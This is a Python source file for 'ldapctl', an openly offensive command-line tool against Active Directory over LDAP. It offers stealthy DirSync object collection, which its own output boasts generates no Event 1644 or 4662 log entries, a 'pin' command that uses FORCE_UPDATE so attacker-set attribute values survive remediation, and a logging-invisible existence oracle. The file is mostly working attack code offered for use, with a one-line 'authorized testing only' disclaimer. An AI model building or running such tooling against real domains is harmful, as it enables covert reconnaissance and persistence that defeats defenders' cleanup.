"""ldapctl — offensive CLI over the validated LDAP-extended-control findings.

  ldapctl collect  — invisible OBJECT_SECURITY DirSync collection (objects + memberships)
  ldapctl pin      — FORCE_UPDATE anti-remediation (make a value survive remediation)
  ldapctl recon    — EXPECTED_ENTRY_COUNT existence oracle (invisible to Event 1644)

Authorized security testing and research only.
"""
from __future__ import annotations
import argparse
import json
import os
import sys

from .ldapconn import connect, root_dn
from .collector import collect
from .forceupdate import pin
from .recon import exists


def _add_common(p):
    p.add_argument("--dc", required=True, help="DC hostname or IP")
    p.add_argument("--user", required=True, help=r"bind user, e.g. DOMAIN\user")
    p.add_argument("--password", default=None,
                   help="bind password (default: $LDAPCTL_PASSWORD)")
    p.add_argument("--auth", choices=["ntlm", "simple"], default="ntlm", help="bind type")
    p.add_argument("--port", type=int, default=389, help="LDAP port (default 389)")
    p.add_argument("-v", "--verbose", action="store_true")


def _password(args) -> str:
    pw = args.password or os.environ.get("LDAPCTL_PASSWORD")
    if not pw:
        print("error: no password (--password or $LDAPCTL_PASSWORD)", file=sys.stderr)
        raise SystemExit(2)
    return pw


def _conn(args):
    return connect(args.dc, args.user, _password(args), auth=args.auth, port=args.port)


def cmd_collect(args) -> int:
    conn = _conn(args)
    base = args.base or root_dn(conn)
    cookie = None
    if args.cookie_file and os.path.exists(args.cookie_file):
        with open(args.cookie_file, "rb") as f:
            cookie = f.read() or None
    attrs = [a.strip() for a in args.attributes.split(",")] if args.attributes else None
    result = collect(conn, base, ldap_filter=args.filter, attributes=attrs, cookie=cookie)
    if args.cookie_file and result.get("cookie"):
        with open(args.cookie_file, "wb") as f:
            f.write(result["cookie"])
    out = {k: v for k, v in result.items() if k != "cookie"}
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(out, f, indent=2)
    print(f"collected {result['count']} objects -> {args.output}")
    print("footprint: OBJECT_SECURITY DirSync generates 0 Event 1644 and 0 Event 4662 "
          "(security descriptors are NOT returned by this path).")
    return 0


def cmd_pin(args) -> int:
    conn = _conn(args)
    try:
        r = pin(conn, args.target_dn, args.attribute, args.value,
                count=args.count, dry_run=args.dry_run)
    except ValueError as e:
        print(f"refused: {e}", file=sys.stderr)
        return 2
    print(json.dumps(r))
    if not args.dry_run:
        print(f"pinned {args.attribute}={args.value!r}: {r['forces_ok']} version-inflating "
              f"forces landed ({r['forces_rejected']} rejected). Detectable via replication "
              f"metadata (version rose with no value change).")
    return 0


def cmd_recon(args) -> int:
    conn = _conn(args)
    print(f"exists: {str(exists(conn, args.dn)).lower()}")
    return 0


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(prog="ldapctl", description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    c = sub.add_parser("collect", help="invisible OBJECT_SECURITY DirSync collection")
    _add_common(c)
    c.add_argument("--base", help="search base DN (default: domain root)")
    c.add_argument("--filter", default="(objectClass=*)", help="LDAP filter")
    c.add_argument("--attributes", help="comma-separated attributes (default: a useful set)")
    c.add_argument("--output", default="collected.json", help="output JSON path")
    c.add_argument("--cookie-file", help="read+write DirSync cookie for incremental runs")
    c.set_defaults(func=cmd_collect)

    p = sub.add_parser("pin", help="FORCE_UPDATE anti-remediation")
    _add_common(p)
    p.add_argument("--target-dn", required=True)
    p.add_argument("--attribute", required=True)
    p.add_argument("--value", required=True)
    p.add_argument("--count", type=int, default=5, help="version-inflating forces (default 5)")
    p.add_argument("--dry-run", action="store_true", help="bind + guard check, do not write")
    p.set_defaults(func=cmd_pin)

    r = sub.add_parser("recon", help="EXPECTED_ENTRY_COUNT existence oracle (invisible to 1644)")
    _add_common(r)
    r.add_argument("--dn", required=True, help="object DN to test for existence")
    r.set_defaults(func=cmd_recon)
    return ap


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
